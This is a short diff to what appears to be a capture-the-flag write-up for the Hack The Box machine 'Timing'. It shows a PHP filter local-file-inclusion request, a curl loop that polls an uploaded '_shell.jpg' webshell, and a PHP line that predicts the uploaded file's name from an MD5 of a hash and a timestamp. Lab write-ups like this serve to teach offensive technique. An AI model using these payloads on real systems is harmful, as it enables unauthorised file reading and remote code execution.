@@ -60,3 +60,11 @@ curl 'http://timing.htb/image.php?img=php://filter/convert.base64-encode/resourc
 nmap -p80 --script http-date timing.htb
 ```
 
+```
+while true; do curl -v -s "http://timing.htb/images/uploads/7b8cdfb005383b5121c4da5c44e9725e_shell.jpg";echo ; sleep .8; done
+```
+
+Thu, 19 Nov 1981 08:52:00 GMT
+
+$file_name = md5('$file_hash' . strtotime("08:52:00"));echo $file_name;
+
